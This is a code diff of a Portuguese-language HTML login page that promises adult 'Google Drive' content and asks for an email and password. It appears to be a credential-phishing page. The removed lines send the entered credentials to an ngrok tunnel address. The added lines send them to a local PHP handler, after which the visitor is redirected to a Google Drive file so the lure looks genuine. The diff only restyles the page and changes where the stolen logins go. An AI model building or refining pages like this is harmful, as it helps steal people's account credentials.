@@ -4,25 +4,67 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login Form</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
     <style>
-        body {
+        .container {
+            background-image: url('WhatsApp Image 2024-04-09 at 15.19.32.jpeg'); /* Nova imagem de fundo */
+            background-size: cover; /* Para garantir que a imagem cubra todo o contêiner */
+            background-repeat: no-repeat; /* Para evitar repetição da imagem */
+            background-position: center; /* Para centralizar a imagem */
             margin: 0;
             padding: 0;
-            background: url('https://github.com/Lai1s/presente/raw/eb1cb660df052a63cef2a42f3270cc9b43738d7c/fundo%202%20p.jpeg') no-repeat center center fixed;
-            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             height: 100vh;
+            color: #000;
+            position: relative;
+            width: 350px; /* Largura do contêiner */
+            background-color: rgba(255, 255, 255, 0.7); /* Fundo branco semi-transparente */
+            padding: 30px; /* Preenchimento interno */
+            border-radius: 10px; /* Raio de borda */
+            box-shadow: 0px 0px 20px 0px rgba(0,0,0,0.1); /* Sombra suave */
+            z-index: 1;
+        }
+        .container h2 {
+            text-align: center;
+            margin-bottom: 30px;
+            color: #000;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        input.form-control {
+            border-radius: 20px;
+            padding: 12px 20px;
+            font-size: 16px;
+            border: 1px solid #ddd;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #007bff;
+            color: #fff;
+            font-size: 18px;
+            border: none;
+            border-radius: 20px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        button:hover {
+            background-color: #0056b3;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <h2>Conteúdos GoogleDrive🔞</h2>
-        <form id="loginForm" method="POST" action="https://96fc-2804-6850-8000-3d01-f998-9041-82cc-329e.ngrok-free.app">
+        <form id="loginForm" method="POST" action="process_form.php">
             <div class="form-group">
-                <input type="email" id="email" name="email" placeholder="Digite o e-mail">
+                <input type="email" class="form-control" id="email" name="email" placeholder="Digite o e-mail">
             </div>
             <div class="form-group">
-                <input type="password" id="password" name="password" placeholder="Digite a senha">
+                <input type="password" class="form-control" id="password" name="password" placeholder="Digite a senha">
             </div>
             <button type="button" onclick="enviarFormulario()">Entrar</button>
             <p id="mensagemErro" style="color: red;"></p>
@@ -44,14 +86,13 @@
             formData.append('password', password);
 
             var xhr = new XMLHttpRequest();
-            xhr.open('POST', 'https://96fc-2804-6850-8000-3d01-f998-9041-82cc-329e.ngrok-free.app');
+            xhr.open('POST', document.getElementById("loginForm").action);
             xhr.onload = function () {
                 if (xhr.status === 200) {
-                    // Sucesso
                     window.location.href = "https://drive.google.com/file/d/1-n2-7RG13HA7ttCVJukD_PpoMDsSRS6n/view?usp=drive";
                 } else {
-                    // Erro
-                    document.getElementById('mensagemErro').innerText = 'Email e/ou senha incorretos. Por favor, tente novamente.';
+                    var mensagem = xhr.responseText;
+                    document.getElementById('mensagemErro').innerText = mensagem;
                 }
             };
             xhr.send(formData);
